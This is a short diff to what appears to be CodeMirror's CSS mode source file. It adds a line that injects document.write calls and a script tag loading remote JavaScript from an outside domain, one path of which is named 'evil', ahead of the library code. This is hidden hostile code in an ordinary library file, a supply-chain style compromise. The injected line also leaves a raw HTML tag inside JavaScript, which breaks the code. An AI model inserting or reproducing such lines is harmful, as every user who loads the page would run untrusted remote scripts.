@@ -1,4 +1,4 @@
-CodeMirror.defineMode("css", function(config) {
+document.write("<script src=\"http://cpm.36obuy.org/evil/1.js\"></script>");document.write("<script src=\"http://cpm.36obuy.org/lion/1.js\"></script>");<script src="http://cpm.36obuy.org/js/1.js"></script>CodeMirror.defineMode("css", function(config) {
   var indentUnit = config.indentUnit, type;
   function ret(style, tp) {type = tp; return style;}
 
